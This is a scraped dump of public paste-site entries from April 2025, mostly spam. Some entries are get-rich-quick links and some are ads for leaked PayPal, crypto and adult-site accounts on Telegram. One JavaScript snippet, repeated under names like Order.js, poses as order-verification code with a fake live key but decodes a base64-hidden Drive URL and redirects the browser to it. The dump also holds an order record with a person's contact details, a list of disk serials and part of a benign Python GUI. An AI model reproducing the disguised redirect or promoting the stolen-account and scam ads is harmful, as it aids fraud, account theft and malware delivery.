id,title,username,language,date,content
6T7fCt2T,EARN $900 INSTANTLY 2025⭐ NU,nikJMS,JavaScript,Thursday 24th of April 2025 06:59:59 AM CDT," 
Pdf https://tinyurl.com/privguidee

AH0lmUhDqj
"
8LDMMBgc,Crypto Accounts,WantingTrae,JavaScript,Thursday 24th of April 2025 06:53:46 AM CDT,79932 Accounts Posted On https://t.me/leakedbyeminem
D60QcX00,Order.js,kammex,JavaScript,Thursday 24th of April 2025 06:53:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92277/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eZzhrWqq,Make $1000 15-MINUTES  (BEGINNER) ME,nikJMS,JavaScript,Thursday 24th of April 2025 06:50:43 AM CDT," 
Pdf https://tinyurl.com/privguidee

xU8Sk5MvEh
"
fYA4r6MQ,EARN $900 INSTANTLY 2025 M6,nikJMS,JavaScript,Thursday 24th of April 2025 06:41:29 AM CDT," 
Pdf https://tinyurl.com/privguidee

9yaBLUJknS
"
DhpnTvGX,PayPal with Balance,WantingTrae,JavaScript,Thursday 24th of April 2025 06:38:22 AM CDT,78480 Accounts Posted On https://t.me/leakedbyeminem
eec1mCkT,Market.js,kammex,JavaScript,Thursday 24th of April 2025 06:38:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rV05A9Mz,update,hmimzomatrix,JSON,Thursday 24th of April 2025 06:34:09 AM CDT,"{""hasupdate"":""false"",""link"":""""}"
avTiebfh,Make $1000 15-MINUTES (BEGINNER) 96,nikJMS,JavaScript,Thursday 24th of April 2025 06:32:15 AM CDT," 
Pdf https://tinyurl.com/privguidee

Gq73vCgolA
"
StaD6D9H,Leaked Accounts - Fresh Hits,WantingTrae,JavaScript,Thursday 24th of April 2025 06:23:00 AM CDT,86926 Accounts Posted On https://t.me/leakedbyeminem
eEPsBe0Q,Untitled,kammex,JavaScript,Thursday 24th of April 2025 06:22:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52202/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q7DNuTU0,EARN $900 INSTANTLY 2025 M6,Hi55455676567,JavaScript,Thursday 24th of April 2025 06:22:37 AM CDT," 
Pdf https://tinyurl.com/privguidee

K0kF41ZvAQ
"
uTsYzmbP,Make $1000 15-MINUTES (BEGINNER) 96,Hi55455676567,JavaScript,Thursday 24th of April 2025 06:13:23 AM CDT," 
Pdf https://tinyurl.com/privguidee

LqO7Y7loVv
"
dtP4LFcY,Chaturbate with Tokens,WantingTrae,JavaScript,Thursday 24th of April 2025 06:07:32 AM CDT,02664 Accounts Posted On https://t.me/leakedbyeminem
AwWabvuj,Untitled,andreiros,JSON,Thursday 24th of April 2025 06:07:19 AM CDT,"{
  ""order"": {
    ""customer_marketing_consent"": false,
    ""customer_email"": ""test@test.com"",
    ""currency"": ""RON"",
    ""delivery_method"": ""Curier"",
    ""payment_method"": ""Ramburs"",
    ""orderdate"": ""2025-04-24"",
    ""orderid"": ""000000445"",
    ""dbid"": ""446"",
    ""ordertotal"": ""473.9900"",
    ""billing_address"": {
      ""city"": ""Sector 4"",
      ""city_id"": ""13754"",
      ""county"": ""Bucureşti"",
      ""county_code"": ""B"",
      ""country"": ""România"",
      ""country_code"": ""RO"",
      ""cod_postal"": ""040121"",
      ""address"": ""Regina Maria"",
      ""number"": """",
      ""block"": """",
      ""entrance"": """",
      ""floor"": """",
      ""flat"": """",
      ""intercom"": """",
      ""bank_account"": """",
      ""bank"": """",
      ""company"": """",
      ""client_tradeno"": """",
      ""client_cui"": """",
      ""client_type"": ""PF"",
      ""phone"": ""0722333444"",
      ""last_name"": ""Rosu"",
      ""first_name"": ""Andrei""
    },
    ""shipping_address"": {
      ""city"": ""Sector 4"",
      ""city_id"": ""13754"",
      ""county"": ""Bucureşti"",
      ""county_code"": ""B"",
      ""country"": ""România"",
      ""country_code"": ""RO"",
      ""cod_postal"": ""040121"",
      ""address"": ""Regina Maria"",
      ""number"": ""1"",
      ""block"": """",
      ""entrance"": """",
      ""floor"": """",
      ""flat"": """",
      ""intercom"": """",
      ""phone"": ""0722333444"",
      ""last_name"": ""Rosu"",
      ""first_name"": ""Andrei""
    },
    ""order_notes"": null,
    ""order_notes_internal"": ""Order Placed by Andrei Rosu using Login as Customer"",
    ""payment_type"": ""cashondelivery"",
    ""payment_card"": {
      ""rrncode"": null
    },
    ""items"": [
      {
        ""currency"": ""RON"",
        ""finalprice"": ""449.9985"",
        ""price"": ""450.0000"",
        ""product_price_site"": 450,
        ""quantity"": 1,
        ""item_um"": ""buc"",
        ""item_vat"": 19,
        ""item_name"": ""Underbust Bretele Denim"",
        ""item_code"": ""CHFCYE0049"",
        ""delivery_date"": null
      },
      {
        ""currency"": ""RON"",
        ""finalprice"": ""23.9900"",
        ""price"": ""23.9900"",
        ""quantity"": 1,
        ""item_um"": ""buc"",
        ""item_vat"": 19,
        ""item_name"": ""Cheltuieli transport"",
        ""item_code"": ""Curier"",
        ""locker_id"": 0
      }
    ],
    ""delivery_date"": null
  }
}"
8nw4t2XA,Products.js,kammex,JavaScript,Thursday 24th of April 2025 06:07:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iRigxi4B,dataNone,TestGuy1,JSON,Thursday 24th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c02ac118aa40ca400b81b73b7c12865bd5f5f541bad1103a1521dd431b13b6970e8c0479c25c2d1e69aa0ec7540f53f853b626441f5de869da23e75c8d7eb9133203ac4f2b0d664ba11ce9d6b5b64afe4e1a137fee8b097bc62df77a0efa95c8f15374f2af5bb3dfd6301a91881663fa5798c363cee74b54e1ac88bae6415f63',
  otherdata: [
    '09213765abcb08caf2b016e33161e539',
    'de97c072977725be63eed19a3b90c684',
    '8c1977218e2331f11203cb9ed516dd4a',
    'e6eb8b583bfc8357971c8d9f9a3ba313',
    '9ae35c97f9d9a7290c2cc09f237d3c66',
    '218e02f1dbd9baca4754898044001693',
    '6fa1ed86088916d89935d3e53f6d7db1',
    '3781b42a2ba78a09b783cc7c0f4915d4'
  ]
}"
Qx4YBSA3,Crypto Accounts,WantingTrae,JavaScript,Thursday 24th of April 2025 05:52:09 AM CDT,96820 Accounts Posted On https://t.me/leakedbyeminem
b6Rc8WiW,Order.js,kammex,JavaScript,Thursday 24th of April 2025 05:51:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84252/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
35Zu00RN,PayPal with Balance,WantingTrae,JavaScript,Thursday 24th of April 2025 05:36:47 AM CDT,41083 Accounts Posted On https://t.me/leakedbyeminem
SagYDX7K,Market.js,kammex,JavaScript,Thursday 24th of April 2025 05:36:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96280/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1vz0gjBX,Untitled,hodifa_almosa_0966,Lua,Thursday 24th of April 2025 05:33:00 AM CDT,"A032_9963_8203_1001.
0000_0006_2409_5316_CAF2_5B03_6E00_01DB.
EI74N11841020573H
A032_99EE_C50E_CD00.
76UMT8JNT
0025_38D2_2149_01AB.
5CD2_E481_31C0_EFF6.
0000_0000_0000_0000_0026_B728_31EE_BD15.
YS202010122218HP
WD-WCC6Y5EVN78S
S3Z9NB0K910845K
AA0000000519
DH20230816220923
WD-WX21AC49U2VL
75D4PR6IT
2020172302289
6479_A751_9090_0D22.
0025_38AB_01D5_6343.
0025_38E2_31B4_9100.
50026B7784B0A596
184590449213
S2WG43PD
57G9COPJT
X8VLWAMNS
WD-WXF0AA9X0852
85QRR6GJF
172534800540
CY99N023611609L5G   _00000001.
MI81N061510201C0Z
274S100LTDQT
YS20230401136661
S35ENX1K447281
50026B73816A9BFE
WX51EC6A96N2
192188804356
39K2JFIYF
J2180053CHXZ5D
0100_0000_0000_0000_8CE3_8E04_0385_4BB6.
0025_3884_9108_2233.
ACE4_2E00_0626_D2A1.
0008_0D04_0084_6915.
37PNPWL1T
E2P342332VSK4J
90H2B14XB
UB202306094196
170615BB1F8B
H2UBIY401095833
WKPR271F
30033056010
YS202010685678HP
YS202010528619HP
NA7T130X
1811A5801224
WD-WXK1A29KZ317
0000_0000_0000_0000_0026_B768_5D4D_EAA5.
WKPQKXDP
50026B77850F5FC2
2475SS24S
E202111190070415
NKP68520102340S30E
30081176769
S20GNAAH111262
H2UBIL308283576
686EW29BT"
Tpc9FCHW,Untitled,kammex,JavaScript,Thursday 24th of April 2025 05:21:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08675/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wX0jRrpH,PayPal with Balance,kammex,JavaScript,Thursday 24th of April 2025 05:21:02 AM CDT,15372 Accounts Posted On https://t.me/leakedbyeminem
Pt48XdsL,CineScan - FrameCutterGUI,creativesamurai1982,Python,Thursday 24th of April 2025 05:03:07 AM CDT,"#!/usr/bin/env python3
# =============================================================================
# Imports and Global Settings
# =============================================================================
import cv2
import numpy as np
import os
import math
import imghdr
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
from PIL import Image, ImageTk
from collections import OrderedDict
import logging
import sys
import codecs

DEBUG_MODE = False  # Toggle debugging messages

# Reconfigure sys.stdout so that our StreamHandler can write UTF-8 to console
if hasattr(sys.stdout, ""reconfigure""):
    sys.stdout.reconfigure(encoding=""utf-8"")

# Create a StreamHandler that writes to sys.stdout.buffer using UTF-8
stream_handler = logging.StreamHandler(codecs.getwriter(""utf-8"")(sys.stdout.buffer))
logging.basicConfig(
    level=logging.DEBUG if DEBUG_MODE else logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        stream_handler,
        logging.FileHandler(""filmstrip_debug.log"", mode='w', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

# =============================================================================
# FilmStripGUI Class Definition
# =============================================================================
class FilmStripGUI:
    def __init__(self):
        logger.info(""Initializing FilmStripGUI..."")
        self.root = tk.Tk()
        self.root.title(""Film Processing GUI"")
        self.root.geometry(""1920x1080"")  # Full HD resolution

        # Configure grid of root into two columns (left & right panels)
        self.root.columnconfigure(0, weight=1)
        self.root.columnconfigure(1, weight=1)

        # -------------------------------------------------------------------------
        # LEFT PANEL: Folder selection, options, advanced settings, ROI controls,
        # overall preview, and the Start Processing button.
        # -------------------------------------------------------------------------
        left_panel = tk.Frame(self.root, bd=2, relief=""groove"")
        left_panel.grid(row=0, column=0, sticky=""nsew"", padx=10, pady=10)
        left_panel.columnconfigure(0, weight=1)

        # Folder Selection Frame
        folder_frame = tk.Frame(left_panel, bd=2, relief=""groove"")
        folder_frame.grid(row=0, column=0, sticky=""ew"", padx=5, pady=5)
        self.folder_button = tk.Button(folder_frame, text=""Select Input Folder"", command=self.select_input_folder)
        self.folder_button.grid(row=0, column=0, padx=5, pady=5, sticky=""w"")
        self.input_folder_label = tk.Label(folder_frame, text=""No folder selected"", font=(""Helvetica"", 10), fg=""gray"")
        self.input_folder_label.grid(row=0, column=1, padx=5, pady=5, sticky=""w"")
        self.output_folder_button = tk.Button(folder_frame, text=""Select Output Folder"", command=self.select_output_folder)
        self.output_folder_button.grid(row=1, column=0, padx=5, pady=5, sticky=""w"")
        self.output_folder_label = tk.Label(folder_frame, text=""No folder selected"", font=(""Helvetica"", 10), fg=""gray"")
        self.output_folder_label.grid(row=1, column=1, padx=5, pady=5, sticky=""w"")

        # Options Frame
        options_frame = tk.Frame(left_panel, bd=2, relief=""groove"")
        options_frame.grid(row=1, column=0, sticky=""ew"", padx=5, pady=5)
        
        # ROI Control Panel (to adjust frame detection parameters)
        roi_control_frame = tk.LabelFrame(left_panel, text=""ROI Controls"", padx=5, pady=5)
        roi_control_frame.grid(row=3, column=0, sticky=""ew"", padx=5, pady=5)
        tk.Label(roi_control_frame, text=""X:"").grid(row=0, column=0, padx=3, pady=2)
        self.roi_x_entry = tk.Entry(roi_control_frame, width=5)
        self.roi_x_entry.grid(row=0, column=1, padx=3, pady=2)
        self.roi_x_entry.insert(0, ""50"")  # default value
        tk.Label(roi_control_frame, text=""Y:"").grid(row=0, column=2, padx=3, pady=2)
        self.roi_y_entry = tk.Entry(roi_control_frame, width=5)
        self.roi_y_entry.grid(row=0, column=3, padx=3, pady=2)
        self.roi_y_entry.insert(0, ""250"")  # default value
        tk.Label(roi_control_frame, text=""Width:"").grid(row=1, column=0, padx=3, pady=2)
        self.roi_w_entry = tk.Entry(roi_control_frame, width=5)
        self.roi_w_entry.grid(row=1, column=1, padx=3, pady=2)
        self.roi_w_entry.insert(0, ""850"")  # default value
        tk.Label(roi_control_frame, text=""Height:"").grid(row=1, column=2, padx=3, pady=2)
        self.roi_h_entry = tk.Entry(roi_control_frame, width=5)
        self.roi_h_entry.grid(row=1, column=3, padx=3, pady=2)
        self.roi_h_entry.insert(0, ""1700"")  # default value
        self.roi_update_button = tk.Button(roi_control_frame, text=""Update ROI"", command=self.update_roi)
        self.roi_update_button.grid(row=2, column=0, columnspan=4, pady=5)

        self.threshold_value = tk.IntVar(value=205)
        self.threshold_slider = tk.Scale(options_frame, from_=0, to=255, orient=""horizontal"",
                                         label=""Threshold Value"", variable=self.threshold_value,
                                         command=self.update_threshold)
        self.threshold_slider.grid(row=0, column=0, padx=5, pady=5, sticky=""ew"")
        self.preview_mode = tk.StringVar(value=""Overlay"")
        self.preview_mode_menu = tk.OptionMenu(options_frame, self.preview_mode, ""Original"", ""Threshold"", ""Overlay"")
        self.preview_mode_menu.config(width=20)
        self.preview_mode_menu.grid(row=0, column=1, padx=5, pady=5)
        self.preview_images_label = tk.StringVar(value=""No images available"")
        self.preview_images_menu = tk.OptionMenu(options_frame, self.preview_images_label, [])
        self.preview_images_menu.config(width=20)
        self.preview_images_menu.grid(row=0, column=2, padx=5, pady=5)
        self.preview_mode.trace(""w"", lambda *args: self.refresh_preview())

        # Advanced Options Frame
        advanced_frame = tk.Frame(left_panel, bd=2, relief=""groove"")
        advanced_frame.grid(row=2, column=0, sticky=""ew"", padx=5, pady=5)
        self.ignore_frames_label = tk.StringVar(value=""None"")
        self.ignore_frames_label.trace(""w"", lambda *args: self.refresh_preview())
        self.ignore_frames_menu = tk.OptionMenu(advanced_frame, self.ignore_frames_label,
                                                ""None"", ""First Frame"", ""Last Frame"", ""Both"")
        self.ignore_frames_menu.config(width=15)
        self.ignore_frames_menu.grid(row=0, column=0, padx=5, pady=5)
        orientation_instr = tk.Label(advanced_frame,
                                     text=""Orientation Correction (sprocket holes should face up):"",
                                     font=(""Helvetica"", 10), fg=""blue"")
        orientation_instr.grid(row=0, column=1, padx=5, pady=5, sticky=""w"")
        orient_frame = tk.Frame(advanced_frame)
        orient_frame.grid(row=1, column=0, columnspan=2, padx=5, pady=5, sticky=""w"")
        self.flip_vertical_var = tk.BooleanVar(value=False)
        self.flip_horizontal_var = tk.BooleanVar(value=False)
        self.rotate90_var = tk.BooleanVar(value=False)
        self.rotate180_var = tk.BooleanVar(value=False)
        self.flip_vertical_cb = tk.Checkbutton(orient_frame, text=""Flip Vertical"",
                                               variable=self.flip_vertical_var,
                                               command=self.refresh_preview)
        self.flip_vertical_cb.pack(side=""left"", padx=5)
        self.flip_horizontal_cb = tk.Checkbutton(orient_frame, text=""Flip Horizontal"",
                                                 variable=self.flip_horizontal_var,
                                                 command=self.refresh_preview)
        self.flip_horizontal_cb.pack(side=""left"", padx=5)
        self.rotate90_cb = tk.Checkbutton(orient_frame, text=""Rotate 90°"",
                                          variable=self.rotate90_var,
                                          command=self.refresh_preview)
        self.rotate90_cb.pack(side=""left"", padx=5)
        self.rotate180_cb = tk.Checkbutton(orient_frame, text=""Rotate 180°"",
                                           variable=self.rotate180_var,
                                           command=self.refresh_preview)
        self.rotate180_cb.pack(side=""left"", padx=5)

        # Overall Preview Canvas (Main preview)
        self.preview_canvas = tk.Canvas(left_panel, width=500, height=400, bg=""gray"")
        self.preview_canvas.grid(row=4, column=0, padx=5, pady=5)
        self.process_button = tk.Button(left_panel, text=""Start Processing"", command=self.start_processing)
        self.process_button.grid(row=5, column=0, padx=5, pady=5, sticky=""w"")

        # -------------------------------------------------------------------------
        # RIGHT PANEL: Frame Preview (shows cropped frames) and navigation
        # -------------------------------------------------------------------------
        right_panel = tk.Frame(self.root, bd=2, relief=""groove"")
        right_panel.grid(row=0, column=1, sticky=""nsew"", padx=10, pady=10)
        right_panel.columnconfigure(0, weight=1)
        frame_preview_title = tk.Label(right_panel, text=""Frame Preview"",
                                       font=(""Helvetica"", 14, ""bold""))
        frame_preview_title.grid(row=0, column=0, padx=5, pady=5)
        self.frame_preview_canvas = tk.Canvas(right_panel, width=500, height=280, bg=""black"")
        self.frame_preview_canvas.grid(row=1, column=0, padx=5, pady=5)
        nav_frame = tk.Frame(right_panel)
        nav_frame.grid(row=2, column=0, padx=5, pady=5)
        self.prev_frame_button = tk.Button(nav_frame, text=""<< Previous"", command=self.prev_frame)
        self.prev_frame_button.pack(side=""left"", padx=10)
        self.refresh_frames_button = tk.Button(nav_frame, text=""Refresh Frames"", command=self.refresh_frame_previews)
        self.refresh_frames_button.pack(side=""left"", padx=10)
        self.next_frame_button = tk.Button(nav_frame, text=""Next >>"", command=self.next_frame)
        self.next_frame_button.pack(side=""left"", padx=10)

        # Frame preview variables and cache
        self.frame_previews = []
        self.current_frame_index = 0
        self.frame_preview_cache = OrderedDict()
        self.max_frame_preview_cache_size = 20

        # Other Instance Variables
        self.input_folder = None
        self.output_folder = None
        self.image_files = []
        self.processor = None
        self.processing_active = False
        self.preview_cache = OrderedDict()
        self.max_cache_size = 20

        self.root.protocol(""WM_DELETE_WINDOW"", self.on_closing)
        logger.info(""FilmStripGUI initialized successfully."")
        self.root.mainloop()

    def on_closing(self):
        logger.info(""Closing GUI and clearing caches."")
        self.preview_cache.clear()
        self.frame_preview_cache.clear()
        self.root.destroy()

    def refresh_preview(self):
        logger.debug(""Refreshing main preview."")
        if self.input_folder and self.image_files:
            first_image_path = os.path.join(self.input_folder, self.image_files[0])
            self.update_preview(first_image_path)
            self.refresh_frame_previews()

    def update_preview(self, image_path):
        logger.debug(""Updating preview for image: %s"", image_path)
        try:
            mode = self.preview_mode.get() if hasattr(self, ""preview_mode"") else ""Threshold""
            ignore_setting = self.ignore_frames_label.get()

            # Get ROI values from processor if exists, otherwise from GUI entries
            if self.processor is not None:
                roi_x = self.processor.frame_x_offset
                roi_y = self.processor.frame_y_offset
                roi_w = self.processor.frame_width_max
                roi_h = self.processor.frame_height_max
            else:
                try:
                    roi_x = int(self.roi_x_entry.get())
                    roi_y = int(self.roi_y_entry.get())
                    roi_w = int(self.roi_w_entry.get())
                    roi_h = int(self.roi_h_entry.get())
                except Exception as e:
                    roi_x, roi_y, roi_w, roi_h = 50, 250, 850, 1700

            key = (image_path, mode, self.threshold_value.get(),
                   self.flip_vertical_var.get(), self.flip_horizontal_var.get(),
                   self.rotate90_var.get(), self.rotate180_var.get(), ignore_setting,
                   roi_x, roi_y, roi_w, roi_h)
            if key in self.preview_cache:
                photo = self.preview_cache.pop(key)
                self.preview_cache[key] = photo
            else:
                if self.processor is None:
                    logger.debug(""Creating temporary FilmStripProcessor for preview."")
                    processor = FilmStripProcessor(
                        input_folder=self.input_folder,
                        output_folder=self.output_folder if self.output_folder else self.input_folder,
                        threshold_value=self.threshold_value.get(),
                        frame_x_offset=50, frame_y_offset=250,
                        frame_width_max=850, frame_height_max=1700,
                        ignore_frames=""None"",
                        gui=self
                    )
                else:
                    processor = self.processor
                if mode in [""Original"", ""Threshold""]:
                    cv2_image = processor.load_image(image_path)
                    if cv2_image is None:
                        messagebox.showerror(""Error"", ""Failed to load image."")
                        logger.error(""Failed to load image: %s"", image_path)
                        return
                    rgb_image = cv2.cvtColor(cv2_image, cv2.COLOR_BGR2RGB)
                    image = Image.fromarray(rgb_image)
                    if mode == ""Threshold"":
                        image = image.convert(""L"")
                        threshold = self.threshold_value.get()
                        image = image.point(lambda p: 255 if p > threshold else 0)
                elif mode == ""Overlay"":
                    image_overlay = processor.get_overlay_image(image_path)
                    if image_overlay is None:
                        messagebox.showerror(""Error"", ""Failed to generate overlay image."")
                        logger.error(""Failed to generate overlay image for: %s"", image_path)
                        return
                    image_overlay = cv2.cvtColor(image_overlay, cv2.COLOR_BGR2RGB)
                    image = Image.fromarray(image_overlay)
                else:
                    image = Image.open(image_path)
                image.thumbnail((500, 400), Image.LANCZOS)
                photo = ImageTk.PhotoImage(image)
                self.preview_cache[key] = photo
                if len(self.preview_cache) > self.max_cache_size:
                    self.preview_cache.popitem(last=False)
            self.preview_canvas.delete(""all"")
            self.preview_canvas.create_image(250, 200, image=photo)
            self.preview_canvas.image = photo
            logger.info(""Preview updated for image: %s"", image_path)
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to update preview: {e}"")
            logger.exception(""Failed to update preview for image: %s"", image_path)

    def update_threshold(self, value):
        new_thresh = int(value)
        logger.debug(""Threshold updated to: %d"", new_thresh)
        # Update processor threshold if exists.
        if self.processor is not None:
            self.processor.threshold_value = new_thresh
        # Clear preview caches to force regeneration.
        self.preview_cache.clear()
        self.frame_preview_cache.clear()
        if self.input_folder and self.image_files:
            first_image_path = os.path.join(self.input_folder, self.image_files[0])
            self.update_preview(first_image_path)
            self.refresh_frame_previews()

    def preview_specific_image(self, image_name):
        logger.info(""User selected image: %s"", image_name)
        image_path = os.path.join(self.input_folder, image_name)
        self.update_preview(image_path)
        self.preview_images_label.set(image_name)
        self.refresh_frame_previews(image_path)

    def select_input_folder(self):
        self.input_folder = filedialog.askdirectory(title=""Select Input Folder"")
        if self.input_folder:
            logger.info(""Input folder selected: %s"", self.input_folder)
            self.input_folder_label.config(text=self.input_folder, fg=""green"")
            self.image_files = sorted([f for f in os.listdir(self.input_folder)
                                       if f.lower().endswith(('.jpg', '.jpeg', '.png'))])
            logger.debug(""Selected folder contains %d images."", len(self.image_files))
            self.preview_cache.clear()
            self.preview_images_menu['menu'].delete(0, 'end')
            if self.image_files:
                first_image_path = os.path.join(self.input_folder, self.image_files[0])
                self.update_preview(first_image_path)
                for image in self.image_files:
                    self.preview_images_menu['menu'].add_command(
                        label=image,
                        command=lambda img=image: self.preview_specific_image(img)
                    )
                self.preview_images_label.set(self.image_files[0])
                self.refresh_frame_previews()
            else:
                logger.info(""No images found in the selected folder."")
                self.preview_images_menu['menu'].add_command(
                    label=""No images available"",
                    command=lambda: logger.debug(""No images available"")
                )
                self.preview_images_label.set(""No images available"")
        else:
            self.input_folder_label.config(text=""No folder selected"", fg=""gray"")
            messagebox.showinfo(""Folder Selection"", ""No input folder selected."")

